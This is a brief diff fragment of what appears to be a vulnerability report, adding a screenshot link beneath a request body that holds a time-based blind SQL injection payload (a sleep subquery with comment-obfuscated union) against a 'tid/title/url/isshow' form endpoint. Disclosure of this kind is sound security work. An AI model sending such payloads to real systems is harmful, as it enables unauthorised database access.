@@ -27,6 +27,7 @@ Content-Length: 47
 
 go=1&tid=1&title=qwd&url=www.baidu.com&isshow=1'and(select*from(select+sleep(6))a/**/union/**/select+1)='
 
+<img width="950" alt="image" src="https://github.com/user-attachments/assets/bef3233f-eaeb-4df7-a233-25e328653e10" />
 
 
 Vulnerability Type: Backend SQL Injection
